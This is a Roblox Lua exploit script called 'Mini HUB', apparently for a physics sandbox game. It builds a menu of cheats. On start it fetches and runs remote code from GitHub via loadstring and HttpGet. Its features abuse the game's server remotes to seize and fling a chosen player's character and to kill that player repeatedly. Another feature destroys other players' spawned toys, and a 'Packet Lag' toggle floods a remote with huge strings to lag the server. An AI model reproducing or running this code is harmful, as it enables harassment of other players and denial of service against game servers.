local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")

local plr = Players.LocalPlayer
local spawnRemote = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")
local destroyToyRemote = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("DestroyToy")

loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()

local sg = Instance.new("ScreenGui")
sg.Name = "MiniHUB"
sg.ResetOnSpawn = false
sg.ZIndexBehavior = Enum.ZIndexBehavior.Global
sg.Parent = CoreGui

local main = Instance.new("Frame")
main.Size = UDim2.new(0, 400, 0, 320)
main.Position = UDim2.new(0.5, -200, 0.5, -160)
main.BackgroundColor3 = Color3.fromRGB(35, 20, 20)
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true
main.Parent = sg
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 8)
local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(255, 80, 80)
mainStroke.Thickness = 1.5
mainStroke.Parent = main

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 28)
title.BackgroundTransparency = 1
title.Text = "Mini HUB"
title.TextColor3 = Color3.fromRGB(255, 100, 100)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = main

local content = Instance.new("Frame")
content.Size = UDim2.new(1, -10, 1, -68)
content.Position = UDim2.new(0, 5, 0, 28)
content.BackgroundTransparency = 1
content.ClipsDescendants = true
content.Parent = main

local tabBar = Instance.new("Frame")
tabBar.Size = UDim2.new(1, -10, 0, 30)
tabBar.Position = UDim2.new(0, 5, 1, -35)
tabBar.BackgroundColor3 = Color3.fromRGB(45, 25, 25)
tabBar.BorderSizePixel = 0
tabBar.Parent = main
Instance.new("UICorner", tabBar).CornerRadius = UDim.new(0, 6)
local tabLayout = Instance.new("UIListLayout")
tabLayout.FillDirection = Enum.FillDirection.Horizontal
tabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
tabLayout.Padding = UDim.new(0, 4)
tabLayout.Parent = tabBar

local pages = {}
local tabBtns = {}
local activeTab = nil

local function switchTab(name)
    if activeTab then
        pages[activeTab].Visible = false
        tabBtns[activeTab].BackgroundColor3 = Color3.fromRGB(55, 30, 30)
        tabBtns[activeTab].TextColor3 = Color3.fromRGB(200, 80, 80)
    end
    activeTab = name
    pages[name].Visible = true
    tabBtns[name].BackgroundColor3 = Color3.fromRGB(100, 40, 40)
    tabBtns[name].TextColor3 = Color3.fromRGB(255, 110, 110)
end

local function createTab(name)
    local page = Instance.new("ScrollingFrame")
    page.Size = UDim2.new(1, 0, 1, 0)
    page.BackgroundTransparency = 1
    page.ScrollBarThickness = 3
    page.ScrollBarImageColor3 = Color3.fromRGB(255, 80, 80)
    page.Visible = false
    page.Parent = content
    local pl = Instance.new("UIListLayout")
    pl.Padding = UDim.new(0, 5)
    pl.Parent = page
    Instance.new("UIPadding", page).PaddingTop = UDim.new(0, 5)
    pl:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        page.CanvasSize = UDim2.new(0, 0, 0, pl.AbsoluteContentSize.Y + 10)
    end)

    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 70, 1, -4)
    btn.BackgroundColor3 = Color3.fromRGB(55, 30, 30)
    btn.BorderSizePixel = 0
    btn.Text = name
    btn.TextColor3 = Color3.fromRGB(200, 80, 80)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 12
    btn.Parent = tabBar
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)
    btn.MouseButton1Click:Connect(function() switchTab(name) end)

    pages[name] = page
    tabBtns[name] = btn
    if not activeTab then switchTab(name) end

    local api = {}

    function api:AddToggle(text, callback)
        local toggled = false
        local f = Instance.new("TextButton")
        f.Size = UDim2.new(1, -10, 0, 28)
        f.BackgroundColor3 = Color3.fromRGB(50, 25, 25)
        f.BorderSizePixel = 0
        f.Text = ""
        f.Parent = page
        Instance.new("UICorner", f).CornerRadius = UDim.new(0, 5)
        local l = Instance.new("TextLabel")
        l.Size = UDim2.new(1, -35, 1, 0)
        l.Position = UDim2.new(0, 8, 0, 0)
        l.BackgroundTransparency = 1
        l.Text = text
        l.TextColor3 = Color3.fromRGB(240, 100, 100)
        l.Font = Enum.Font.Gotham
        l.TextSize = 13
        l.TextXAlignment = Enum.TextXAlignment.Left
        l.Parent = f
        local ind = Instance.new("Frame")
        ind.Size = UDim2.new(0, 14, 0, 14)
        ind.Position = UDim2.new(1, -22, 0.5, -7)
        ind.BackgroundColor3 = Color3.fromRGB(70, 30, 30)
        ind.BorderSizePixel = 0
        ind.Parent = f
        Instance.new("UICorner", ind).CornerRadius = UDim.new(0, 4)
        f.MouseButton1Click:Connect(function()
            toggled = not toggled
            ind.BackgroundColor3 = toggled and Color3.fromRGB(255, 70, 70) or Color3.fromRGB(70, 30, 30)
            if callback then callback(toggled) end
        end)
    end

    function api:AddInput(text, default, callback)
        local f = Instance.new("Frame")
        f.Size = UDim2.new(1, -10, 0, 28)
        f.BackgroundColor3 = Color3.fromRGB(50, 25, 25)
        f.BorderSizePixel = 0
        f.Parent = page
        Instance.new("UICorner", f).CornerRadius = UDim.new(0, 5)
        local l = Instance.new("TextLabel")
        l.Size = UDim2.new(0.5, -5, 1, 0)
        l.Position = UDim2.new(0, 8, 0, 0)
        l.BackgroundTransparency = 1
        l.Text = text
        l.TextColor3 = Color3.fromRGB(240, 100, 100)
        l.Font = Enum.Font.Gotham
        l.TextSize = 13
        l.TextXAlignment = Enum.TextXAlignment.Left
        l.Parent = f
        local box = Instance.new("TextBox")
        box.Size = UDim2.new(0.45, 0, 0, 20)
        box.Position = UDim2.new(0.52, 0, 0.5, -10)
        box.BackgroundColor3 = Color3.fromRGB(70, 30, 30)
        box.BorderSizePixel = 0
        box.Text = tostring(default)
        box.TextColor3 = Color3.fromRGB(255, 130, 130)
        box.Font = Enum.Font.Gotham
        box.TextSize = 13
        box.ClearTextOnFocus = false
        box.Parent = f
        Instance.new("UICorner", box).CornerRadius = UDim.new(0, 4)
        box.FocusLost:Connect(function()
            if callback then callback(box.Text) end
        end)
    end

    function api:AddDropdown(text, list, callback)
        local selected = list[1]
        local open = false
        local f = Instance.new("Frame")
        f.Size = UDim2.new(1, -10, 0, 28)
        f.BackgroundColor3 = Color3.fromRGB(50, 25, 25)
        f.BorderSizePixel = 0
        f.ClipsDescendants = false
        f.Parent = page
        Instance.new("UICorner", f).CornerRadius = UDim.new(0, 5)
        local btn2 = Instance.new("TextButton")
        btn2.Size = UDim2.new(1, 0, 0, 28)
        btn2.BackgroundTransparency = 1
        btn2.Text = text .. ": " .. tostring(selected)
        btn2.TextColor3 = Color3.fromRGB(240, 100, 100)
        btn2.Font = Enum.Font.Gotham
        btn2.TextSize = 12
        btn2.Parent = f
        local dropFrame = Instance.new("Frame")
        dropFrame.Size = UDim2.new(1, 0, 0, #list * 22)
        dropFrame.Position = UDim2.new(0, 0, 1, 2)
        dropFrame.BackgroundColor3 = Color3.fromRGB(40, 20, 20)
        dropFrame.BorderSizePixel = 0
        dropFrame.Visible = false
        dropFrame.ZIndex = 50
        dropFrame.Parent = f
        Instance.new("UICorner", dropFrame).CornerRadius = UDim.new(0, 5)
        Instance.new("UIListLayout", dropFrame).Padding = UDim.new(0, 2)

        local function makeOptions(optList)
            for _, c in pairs(dropFrame:GetChildren()) do
                if c:IsA("TextButton") then c:Destroy() end
            end
            dropFrame.Size = UDim2.new(1, 0, 0, #optList * 22)
            for _, v in pairs(optList) do
                local ob = Instance.new("TextButton")
                ob.Size = UDim2.new(1, 0, 0, 20)
                ob.BackgroundColor3 = Color3.fromRGB(55, 28, 28)
                ob.BorderSizePixel = 0
                ob.Text = v
                ob.TextColor3 = Color3.fromRGB(220, 90, 90)
                ob.Font = Enum.Font.Gotham
                ob.TextSize = 11
                ob.ZIndex = 51
                ob.Parent = dropFrame
                Instance.new("UICorner", ob).CornerRadius = UDim.new(0, 4)
                ob.MouseButton1Click:Connect(function()
                    selected = v
                    btn2.Text = text .. ": " .. v
                    dropFrame.Visible = false
                    open = false
                    if callback then callback(v) end
                end)
            end
        end

        makeOptions(list)
        btn2.MouseButton1Click:Connect(function()
            open = not open
            dropFrame.Visible = open
        end)
        return {
            Refresh = function(_, newList)
                makeOptions(newList)
            end
        }
    end

    return api
end

local function getPlayerList()
    local list = {}
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= plr then table.insert(list, p.DisplayName .. "/" .. p.Name) end
    end
    return list
end

local function getTarget(str)
    if not str then return nil end
    return Players:FindFirstChild(str:match("/(.+)$") or str)
end

local defTab = createTab("Defense")
local kickTab = createTab("Kick")
local lagTab = createTab("Lags")

defTab:AddToggle("Auto Break PCLD", function(v)
    _G.MINI_PcldLoop = v
    if not v then return end
    task.spawn(function()
        if plr.Character and plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid.Health > 0 then
            plr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
            plr.Character.Humanoid.Health = 0
        end
        plr.CharacterAdded:Wait()
        task.wait()
        if plr.Character and plr.Character:FindFirstChild("Humanoid") then
            plr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
            plr.Character.Humanoid.Health = 0
        end
        task.wait(3)
        while _G.MINI_PcldLoop do
            task.wait(0.1)
            if plr.Character and plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid.Health <= 0 then
                plr.CharacterAdded:Wait()
                task.wait()
                if _G.MINI_PcldLoop and plr.Character and plr.Character:FindFirstChild("Humanoid") then
                    plr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
                    plr.Character.Humanoid.Health = 0
                    task.wait(3)
                end
            end
        end
    end)
end)

defTab:AddToggle("Auto Reset", function(v)
    _G.MINI_AutoReset = v
    if not v then
        if _G.MINI_AutoResetConn then _G.MINI_AutoResetConn:Disconnect() _G.MINI_AutoResetConn = nil end
        return
    end
    _G.MINI_AutoResetConn = ReplicatedStorage:WaitForChild("GameCorrectionEvents"):WaitForChild("GameCorrectionsNotify").OnClientEvent:Connect(function(reason)
        if reason == "Flying" and _G.MINI_AutoReset then
            if plr.Character and plr.Character:FindFirstChild("Humanoid") then
                plr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
                plr.Character.Humanoid.Health = 0
            end
        end
    end)
end)

_G.MINI_KickTarget = nil
local targetDrop = kickTab:AddDropdown("Target", getPlayerList(), function(v)
    _G.MINI_KickTarget = v
end)

task.spawn(function()
    while true do
        task.wait(2)
        targetDrop:Refresh(getPlayerList())
    end
end)

kickTab:AddToggle("Kick Grab", function(v)
    _G.MINI_KickGrab = v
    if not v then
        if _G.MINI_KickTarget then
            local target = getTarget(_G.MINI_KickTarget)
            local tHRP = target and target.Character and target.Character:FindFirstChild("HumanoidRootPart")
            if tHRP then
                if tHRP:FindFirstChild("MINI_BP") then tHRP.MINI_BP:Destroy() end
                if tHRP:FindFirstChild("MINI_BG") then tHRP.MINI_BG:Destroy() end
            end
        end
        return
    end
    task.spawn(function()
        local setOwner = ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
        local destroyLine = ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("DestroyGrabLine")
        local target = getTarget(_G.MINI_KickTarget)
        local char = plr.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if target and target.Character and hrp then
            local tHRP = target.Character:FindFirstChild("HumanoidRootPart")
            if tHRP then
                local savedCF = hrp.CFrame
                hrp.CFrame = tHRP.CFrame
                hrp.AssemblyLinearVelocity = Vector3.zero
                task.wait(0.15)
                setOwner:FireServer(tHRP, tHRP.CFrame)
                destroyLine:FireServer(tHRP)
                hrp.CFrame = savedCF
                hrp.AssemblyLinearVelocity = Vector3.zero
            end
        end
        while _G.MINI_KickGrab do
            target = getTarget(_G.MINI_KickTarget)
            char = plr.Character
            hrp = char and char:FindFirstChild("HumanoidRootPart")
            if target and target.Character and hrp then
                local tHRP = target.Character:FindFirstChild("HumanoidRootPart")
                if tHRP then
                    setOwner:FireServer(tHRP, tHRP.CFrame)
                    destroyLine:FireServer(tHRP)
                    local bp = tHRP:FindFirstChild("MINI_BP")
                    if not bp then
                        bp = Instance.new("BodyPosition")
                        bp.Name = "MINI_BP"
                        bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                        bp.D = 100
                        bp.P = 100000
                        bp.Parent = tHRP
                    end
                    bp.Position = hrp.Position + Vector3.new(0, 14, 0)
                    local bg = tHRP:FindFirstChild("MINI_BG")
                    if not bg then
                        bg = Instance.new("BodyGyro")
                        bg.Name = "MINI_BG"
                        bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                        bg.P = 100000
                        bg.Parent = tHRP
                    end
                    bg.CFrame = hrp.CFrame
                    tHRP.AssemblyLinearVelocity = Vector3.zero
                    tHRP.AssemblyAngularVelocity = Vector3.zero
                    local spawned = workspace:FindFirstChild(target.Name .. "SpawnedInToys")
                    if spawned then
                        for _, toyName in pairs({"NinjaKunai", "NinjaShuriken"}) do
                            local toy = spawned:FindFirstChild(toyName)
                            if toy then
                                local part = toy:FindFirstChild("SoundPart")
                                if part then
                                    setOwner:FireServer(part, part.CFrame)
                                    if part:FindFirstChild("PartOwner") and part.PartOwner.Value == plr.Name then
                                        part.CFrame = CFrame.new(0, 10000, 0)
                                    end
                                end
                            end
                        end
                    end
                end
            end
            RunService.Heartbeat:Wait()
        end
    end)
end)

kickTab:AddToggle("Destroy Gucci", function(v)
    _G.MINI_DestroyGucci = v
    if not v then return end
    task.spawn(function()
        local char = plr.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local safeSpot = hrp and hrp.CFrame
        while _G.MINI_DestroyGucci do
            local target = getTarget(_G.MINI_KickTarget)
            if target then
                local folder = workspace:FindFirstChild(target.Name .. "SpawnedInToys")
                if folder then
                    for _, obj in pairs(folder:GetChildren()) do
                        if not _G.MINI_DestroyGucci then break end
                        if obj.Name == "CreatureBlobman" or obj.Name:find("Tractor") then
                            local seat = obj:FindFirstChildWhichIsA("VehicleSeat", true) or obj:FindFirstChildWhichIsA("Seat", true)
                            if seat then
                                local hum = plr.Character and plr.Character:FindFirstChild("Humanoid")
                                hrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                                if hum and hrp then
                                    safeSpot = hrp.CFrame
                                    seat:Sit(hum)
                                    task.wait(0.3)
                                    hum.Sit = false
                                    hum:ChangeState(Enum.HumanoidStateType.Jumping)
                                    task.wait(0.1)
                                    destroyToyRemote:FireServer(obj)
                                    task.wait(0.1)
                                    if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                                        plr.Character.HumanoidRootPart.CFrame = safeSpot
                                        plr.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero
                                    end
                                end
                            end
                        end
                    end
                end
            end
            task.wait(0.5)
        end
    end)
end)

kickTab:AddToggle("Blob Kick", function(v)
    _G.MINI_BlobKick = v
    if not v then return end
    task.spawn(function()
        while _G.MINI_BlobKick do
            local char = plr.Character
            local hum = char and char:FindFirstChild("Humanoid")
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if not hum or not hrp then task.wait(1) continue end
            local mytoys = workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
            if not mytoys then task.wait(1) continue end
            local savedPos = hrp.CFrame
            local done = false
            local conn
            conn = mytoys.ChildAdded:Connect(function(toy)
                if toy.Name ~= "CreatureBlobman" or done then return end
                done = true
                if conn then conn:Disconnect() end
                local vehsit = toy:WaitForChild("VehicleSeat", 2)
                local ld = toy:WaitForChild("LeftDetector", 2)
                local rd = toy:WaitForChild("RightDetector", 2)
                local lw = ld and ld:WaitForChild("LeftWeld", 2)
                local rw = rd and rd:WaitForChild("RightWeld", 2)
                local bScript = toy:WaitForChild("BlobmanSeatAndOwnerScript", 2)
                local grab = bScript and bScript:WaitForChild("CreatureGrab", 2)
                local release = bScript and bScript:WaitForChild("CreatureRelease", 2)
                if not (vehsit and ld and rd and lw and rw and grab and release) then return end
                local st = tick()
                while vehsit.Occupant ~= hum and tick() - st < 2 do vehsit:Sit(hum) task.wait() end
                task.wait(0.1)
                while _G.MINI_BlobKick do
                    if not hum.SeatPart or not hum.SeatPart.Parent or hum.SeatPart.Parent.Name ~= "CreatureBlobman" then break end
                    local target = getTarget(_G.MINI_KickTarget)
                    if not target or not target.Character then task.wait(0.5) continue end
                    local tHRP = target.Character:FindFirstChild("HumanoidRootPart")
                    local tHum = target.Character:FindFirstChild("Humanoid")
                    if not tHRP or not tHum or tHum.Health <= 0 then task.wait(0.5) continue end
                    if (hrp.Position - tHRP.Position).Magnitude > 30 then
                        hrp.CFrame = tHRP.CFrame * CFrame.new(0, 20, 0)
                        hrp.AssemblyLinearVelocity = Vector3.zero
                        task.wait(0.2)
                    end
                    for i = 1, 2 do
                        local det = i == 1 and ld or rd
                        local weld = i == 1 and lw or rw
                        grab:FireServer(det, tHRP, weld)
                        task.wait(0.05)
                        release:FireServer(weld)
                        task.wait(0.05)
                        if tHum.Health > 0 then tHum:ChangeState(Enum.HumanoidStateType.Dead) end
                    end
                    task.wait(0.3)
                end
                if hrp and hrp.Parent then hrp.CFrame = savedPos hrp.AssemblyLinearVelocity = Vector3.zero end
                destroyToyRemote:FireServer(toy)
            end)
            local existing = mytoys:FindFirstChild("CreatureBlobman")
            if existing then destroyToyRemote:FireServer(existing) task.wait(0.5) end
            spawnRemote:InvokeServer("CreatureBlobman", hrp.CFrame, Vector3.zero)
            local st2 = tick()
            while not done and _G.MINI_BlobKick and tick() - st2 < 5 do task.wait(0.1) end
            if not done and conn then conn:Disconnect() end
            while not done and _G.MINI_BlobKick do task.wait(0.1) end
            if not _G.MINI_BlobKick then
                if conn then conn:Disconnect() end
                local blob = mytoys:FindFirstChild("CreatureBlobman")
                if blob then destroyToyRemote:FireServer(blob) end
                break
            end
            task.wait(1)
        end
    end)
end)

_G.MINI_PacketStr = 2200
lagTab:AddInput("Packet Strength", "2200", function(v)
    local num = tonumber(v)
    if num then _G.MINI_PacketStr = num end
end)

lagTab:AddToggle("Packet Lag", function(v)
    _G.MINI_PacketLag = v
    if not v then return end
    task.spawn(function()
        local remote = ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("ExtendGrabLine")
        local data = string.rep("🟥🟥🟥🟥🟥🟥🟥", 400)
        while _G.MINI_PacketLag do
            task.spawn(function()
                remote:FireServer(string.rep(data, _G.MINI_PacketStr))
            end)
            task.wait(0.24)
        end
    end)
end)

UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.M then
        main.Visible = not main.Visible
    end
end)